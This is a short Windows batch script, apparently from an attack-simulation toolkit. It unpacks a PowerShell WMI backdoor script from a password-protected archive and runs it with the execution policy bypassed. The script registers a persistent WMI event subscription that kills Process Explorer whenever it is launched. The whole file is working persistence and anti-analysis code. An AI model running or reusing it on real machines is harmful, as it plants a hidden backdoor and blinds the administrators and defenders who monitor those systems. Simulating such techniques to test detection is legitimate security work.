@ECHO OFF

ECHO ===========================================================================
ECHO WMI Backdoor
ECHO.
ECHO Using Matt Graeber's WMIBackdoor to kill local procexp64.exe when it starts
ping -n 5 127.0.0.1 > NUL

"%ZIP%" e -p%PASS% %TOOLARCH% -aoa -o"%APTDIR%" toolset\WMIBackdoor.ps1 > NUL

powershell.exe -Exec ByPasS ". %APTDIR%\WMIBackdoor.ps1;$Trigger1=New-WMIBackdoorTrigger -ProcessName 'procexp64.exe';$Action1=New-WMIBackdoorAction -KillProcess; $Registration1=Register-WMIBackdoor -Trigger $Trigger1 -Action $Action1"
